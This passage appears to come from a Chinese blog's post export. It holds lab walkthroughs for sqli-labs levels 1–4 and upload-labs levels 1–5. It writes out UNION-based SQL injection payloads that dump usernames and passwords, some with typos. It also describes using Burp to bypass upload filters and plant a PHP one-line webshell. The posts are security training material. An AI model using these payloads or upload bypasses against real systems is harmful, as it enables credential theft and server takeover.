<p><img src="https://img-blog.csdnimg.cn/20210330203140931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可见username中第一个字符为：D<br>然后就这样依次进行得到<strong>username:Dumb,password:Dumb</strong></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实这样下来程序是十分繁杂的，接下来将会使用burp工具来爆破进行获取信息。</p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs闯关1-4</title>
    <url>/2021/06/05/sqli-labs%E9%97%AF%E5%85%B31-4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="一、第1-2关：基于错误的字符串-数字型注入"><a href="#一、第1-2关：基于错误的字符串-数字型注入" class="headerlink" title="一、第1-2关：基于错误的字符串/数字型注入"></a>一、第1-2关：基于错误的字符串/数字型注入</h1><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">2.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">4.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_shcema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">6.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> form users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>第一关在之前学习：联合查询，以及示例因此从第二关开始记录。<br>其实第一关和第二关差别不大：闭合符合的差别。</p>
<p><strong>判断注入点</strong><br><img src="https://img-blog.csdnimg.cn/20210312204500947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210312204517868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210312204536142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以判断为数字型注入<br><strong>确定属性列数目</strong><br>使用<code>?id=1 order by 数字 --+</code>不断尝试数字最大值<br><img src="https://img-blog.csdnimg.cn/20210313094145196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到列数最大为三</p>
<p><strong>确定回显属性</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 union select 1,2,3 --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313094539526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>回显属性为2，3</p>
<p><strong>查找数据库</strong><br><img src="https://img-blog.csdnimg.cn/20210313094807414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到数据库名：security</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">？id&#x3D;-1 union select 1,database(),3 --+<br></code></pre></td></tr></table></figure>
<p><strong>查看表名</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313095015810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>获取列名</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313095312949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>获取字段信息</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 union select 1,group_concat(concat_ws(0x23,username,password)),3 from users --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313095419677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="二、第三关"><a href="#二、第三关" class="headerlink" title="二、第三关"></a>二、第三关</h1><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27;) order by 4 --+</span><br><span class="hljs-string">2.?id=-1 &#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-string">&#x27;) union select 1,database(),3 --+</span><br><span class="hljs-string">4.?id=-1 &#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-string">&#x27;) union select 1,group_concat(column_name),3 from information_shcema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">6.?id=-1 &#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> form users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>本题与之前的题目的区别就在于闭合符号的不同这里使用：<code>&#39;)</code>来进行闭合。题目思路大概都差不多着重讲解一下起初如何判断<br><img src="https://img-blog.csdnimg.cn/20210313100140176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210313100200323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到无论是 <code>and 1=1 --+</code>还是<code>and 1=2 --+ </code>回显正常</p>
<p><img src="https://img-blog.csdnimg.cn/20210313100357280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但是当输入<code>?id=1 &#39; --+</code>则出现异常因此可以判断为字符类注入<br>当<code>?id=1 &#39;) --+</code><img src="https://img-blog.csdnimg.cn/20210313100634234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>页面正常这说明：<strong>是以 (‘’)的方式闭合字符串的</strong><br>接下来便与1-2关无大差异，我们来看一下如何解题</p>
<p><strong>确定属性列数目</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;1&#39;) order by 4 --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313100925390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>判断列数为3</p>
<p><strong>确定回显属性</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1&#39;) union select 1,2,3 --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313101109202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>获取库名</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1&#39;) union select 1,database(),3 --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313101207525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>获取表名</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313101333764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>获取列名</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313101516239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>获取字段信息</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1&#39; )union select 1,group_concat(concat_ws(0x23,username,password)),3 from users --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313101620556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="三、第四关"><a href="#三、第四关" class="headerlink" title="三、第四关"></a>三、第四关</h1><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> &quot;) order by 4 --+<br>2.?id=-1 &quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> &quot;) union select 1,database(),3 --+<br>4.?id=-1 &quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> &quot;) union select 1,group_concat(column_name),3 from information_shcema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+<br>6.?id=-1 &quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> form users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>第四关与第三关的区别就在于注入的字符类型在这里是：<code>  (&quot;&quot;)</code>进行闭合，接下来就开始吧。<br><strong>判断注入点</strong><br>大体上与第三关无差，当发现注入类型不是<strong>整型注入</strong>，进行字符类型判断<br>当输入<code>?id=1&quot; --+</code>时会发现出现错误<img src="https://img-blog.csdnimg.cn/20210313102347801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此使用：<code>?id=1 &quot;）--+</code>进行闭合<br><img src="https://img-blog.csdnimg.cn/20210313102437168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>显示正常，接下来开始操作</p>
<p><strong>确定属性列数目</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;1&#39;) order by 4 --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313102600341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>列数为3</p>
<p><strong>确定回显属性</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &quot;) union select 1,2,3  --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313102708472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>获取库名</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &quot;) union select 1,database(),3 --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313102818938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>库名为：security</p>
<p><strong>获取表名</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313103247311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>获取列名</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313103543116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>获取字段信息</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &quot;) union select 1,group_concat(concat_ws(0x23,username,password)),3 from users --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210313103803260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>upload-labs-第一关</title>
    <url>/2021/06/05/upload-labs-%E7%AC%AC%E4%B8%80%E5%85%B3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="客户端js验证绕过上传-（1）"><a href="#客户端js验证绕过上传-（1）" class="headerlink" title="客户端js验证绕过上传-（1）`"></a>客户端js验证绕过上传-（1）`</h1><p>让我们看看第一关说了什么<img src="https://img-blog.csdnimg.cn/20210411092634950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>基于“JS本地验证”绕过其实也就是：客户端js检查类型的上传漏洞是Web系统的上传功能在前端页面使用javascript脚本对要上传的文件进行检查，在服务器端没有进行检查，而造成的缺陷。</strong><br><img src="https://img-blog.csdnimg.cn/20210411093257848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码，会发现，上传文件的格式只有三种，那么如何绕过达到实现上传我们想要上传的文件也就是我们需要达到的目的了</p>
<h2 id="Burp抓包改包"><a href="#Burp抓包改包" class="headerlink" title="Burp抓包改包"></a>Burp抓包改包</h2><p><strong>一.为了抓包成功，我们先将写好的一句话木马文件的格式修改为<code>.jpg</code>格式进行上传，同时burp设置为拦截模式。点击上传，即可拦截到上传的数据包。</strong><img src="https://img-blog.csdnimg.cn/20210411095836514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时的格式为.jpg</p>
<p><strong>二：改包</strong><br>将filename=后的文件修改为：<code>shell.php</code><br><img src="https://img-blog.csdnimg.cn/2021041110002883.png" alt="在这里插入图片描述"><br><strong>三：放包</strong><br>点开放包按钮，将修改后的数据包发送出去<br><img src="https://img-blog.csdnimg.cn/20210411100209954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看文件是否上传成功</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">upload-labs-master\upload<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210411100427576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到文件格式是.php说明一句话木马上传成功</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当然客户端js验证绕过上传作为第一关是最基础的绕过方法，不仅仅可以使用burp进行操作同时也可以直接修改源码保存到本地进行绕过。</p>
]]></content>
  </entry>
  <entry>
    <title>upload-靶场练习</title>
    <url>/2021/06/05/upload-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="MIME类型验证绕过上传-第二关"><a href="#MIME类型验证绕过上传-第二关" class="headerlink" title="MIME类型验证绕过上传-第二关"></a>MIME类型验证绕过上传-第二关</h1><h3>基于这种类型的文件上传我们只需要将验证了Content-Type 改成图片的MIME类型即可</h3>

<p><img src="https://img-blog.csdnimg.cn/2021041115592293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>抓包</strong><br><img src="https://img-blog.csdnimg.cn/20210411160046929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>修改Content-Type</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20210411160242661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210416193455741.png" alt="在这里插入图片描述"></p>
<p>上传成功</p>
<h1 id="黑名单后缀名-php3、phtml-绕过上传-第三关"><a href="#黑名单后缀名-php3、phtml-绕过上传-第三关" class="headerlink" title="黑名单后缀名(php3、phtml)绕过上传-第三关"></a>黑名单后缀名(php3、phtml)绕过上传-第三关</h1><p><img src="https://img-blog.csdnimg.cn/20210411160927254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>这关检测了文件后缀名，禁止了常见动态脚本后缀<br>不过php3 和pthml没有禁止，在apache配置文件中当php解析</strong><br><img src="https://img-blog.csdnimg.cn/20210411161137166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>与第一关差不多将后缀修改为<code>.phtml</code>然后放包<br><img src="https://img-blog.csdnimg.cn/2021041116132739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>返回查看上传文件，成功了<br><img src="https://img-blog.csdnimg.cn/20210411161415736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但不知道是版本原因还是什么，一直解析不出来，头疼</p>
<h1 id="htaccess配置文件绕过上传-第四个"><a href="#htaccess配置文件绕过上传-第四个" class="headerlink" title=".htaccess配置文件绕过上传-第四个"></a>.htaccess配置文件绕过上传-第四个</h1><p><img src="https://img-blog.csdnimg.cn/202104122044522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>这关把所有动态后缀都禁用了，包括php3、phtml，但是目录下没有.htaccess配置文件</p>
<p>我们可以通过上传这个配置文件达到以php解析的目的</p>
<p>与前几关方法相同：<br><img src="https://img-blog.csdnimg.cn/20210412204613529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进行后缀修改<br><img src="https://img-blog.csdnimg.cn/20210412204711902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改后发送成功成功上传，返回页面进行查看<br><img src="https://img-blog.csdnimg.cn/2021041220484757.png" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>upload练习（二）</title>
    <url>/2021/06/05/upload%E7%BB%83%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">



<h1 id="黑名单后缀名绕过上传-第五关"><a href="#黑名单后缀名绕过上传-第五关" class="headerlink" title="黑名单后缀名绕过上传-第五关"></a>黑名单后缀名绕过上传-第五关</h1><p><img src="https://img-blog.csdnimg.cn/20210419191746965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419191732497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419191855943.png" alt="在这里插入图片描述"><br>根据提示本关已经有<code>.htaccess</code>，<strong>并且会自动过滤文件名后的点，以及大小写还有字符串、空格</strong>因此我们需要多尝试添加过滤的字符进行绕过</p>
